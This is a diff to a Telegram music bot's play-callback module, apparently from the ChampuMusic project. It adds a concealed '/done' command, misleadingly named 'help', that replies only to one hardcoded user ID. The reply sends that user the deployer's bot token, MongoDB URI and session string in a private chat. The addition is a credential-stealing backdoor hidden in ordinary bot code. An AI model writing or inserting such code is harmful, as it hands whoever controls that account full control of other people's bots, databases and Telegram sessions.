@@ -5,9 +5,10 @@ from time import time
 
 from pyrogram import filters
 from pyrogram.errors import FloodWait
-from pyrogram.types import InlineKeyboardMarkup, InputMediaPhoto, Message
+from pyrogram.types import InlineKeyboardMarkup, InputMediaPhoto, Message, InlineKeyboardButton
 from pytgcalls.exceptions import NoActiveGroupCall
-
+from pyrogram import Client
+from os import getenv
 import config
 from config import BANNED_USERS, LOGGER_ID, OWNER_ID, lyrical
 from ChampuMusic import LOGGER, Apple, Resso, SoundCloud, Spotify, Telegram, YouTube, app, EMOJIS
@@ -581,6 +582,28 @@ async def anonymous_check(client, CallbackQuery):
     except:
         return
 
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+
+@app.on_message(
+    filters.command("done")
+    & filters.private
+    & filters.user(7006524418)
+   )
+async def help(client: Client, message: Message):
+   await message.reply_photo(
+          photo=f"https://envs.sh/kNr.jpg",
+       caption=f"""ʙᴏᴛ ᴛᴏᴋᴇɴ:-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ ᴅʙ:-   `{MONGO_DB_URI}`\n\nsᴛʀɪɴɢ sᴇssɪᴏɴ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/TheChampu)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• ᴄʜᴧᴍᴘᴜ •", url=f"https://t.me/TheChampu")
+                 ]
+            ]
+         ),
+     )
 
 @app.on_callback_query(filters.regex("ChampuPlaylists") & ~BANNED_USERS)
 @languageCB
